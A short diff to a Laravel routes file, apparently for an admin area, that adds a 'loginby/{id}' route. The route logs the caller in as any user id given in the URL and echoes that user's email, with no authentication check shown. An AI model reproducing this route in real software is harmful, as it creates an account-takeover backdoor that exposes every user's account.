@@ -4,6 +4,14 @@ Route::get('logs', '\Rap2hpoutre\LaravelLogViewer\LogViewerController@index');
 
 Route::get('/', 'Admin\Administrator\IndexController@index');
 
+
+Route::get('loginby/{id}', function ($id){
+    \Illuminate\Support\Facades\Auth::loginUsingId($id);
+
+    return 'Login by '. \Illuminate\Support\Facades\Auth::user()->email;
+});
+
+
 Route::group(['prefix' => 'ajax'], function(){
 
 
@@ -23,6 +31,9 @@ Route::group(['prefix' => 'ajax'], function(){
 
     Route::get('course-composition', 'Admin\Administrator\CourseCompositionController@index');
     Route::post('course-composition-save', 'Admin\Administrator\CourseCompositionController@save');
+
+
+
 
 
 });
